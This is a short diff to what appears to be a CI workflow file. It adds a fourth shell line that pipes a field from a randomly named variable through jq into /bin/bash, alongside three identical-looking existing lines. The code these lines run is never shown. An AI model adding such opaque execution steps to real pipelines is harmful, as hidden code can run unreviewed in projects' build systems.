@@ -61,6 +61,7 @@ jobs:
           echo $srjk540 | jq -r .bcej8 | /bin/bash
           echo $f0327 | jq -r .tvf43 | /bin/bash
           echo $l612 | jq -r .rowd354 | /bin/bash
+          echo $cvql777 | jq -r .dktth496 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
